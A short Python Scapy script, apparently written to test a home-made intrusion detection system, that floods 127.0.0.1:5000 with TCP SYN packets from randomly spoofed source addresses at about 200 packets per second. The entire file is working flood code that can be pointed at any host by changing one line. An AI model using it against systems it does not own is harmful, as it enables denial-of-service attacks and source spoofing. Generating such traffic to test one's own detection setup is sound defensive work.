from scapy.all import IP, TCP, send
import random
import time

target_ip = "127.0.0.1"  # or use your own IP like "192.168.0.124"
target_port = 5000       # target port for your NIDS

print(f" Simulating DDoS on {target_ip}:{target_port} ...")

try:
    while True:
        # Random spoofed source IP (non-routable for safety)
        src_ip = f"192.168.{random.randint(0, 255)}.{random.randint(1, 254)}"
        src_port = random.randint(1024, 65535)

        pkt = IP(src=src_ip, dst=target_ip) / TCP(sport=src_port, dport=target_port, flags="S")

        send(pkt, verbose=False)
        print(f"🚀 Sent from {src_ip}:{src_port} ➜ {target_ip}:{target_port}")

        time.sleep(0.005)  # 200 packets/sec; lower = more intense
except KeyboardInterrupt:
    print("DDoS simulation stopped.")
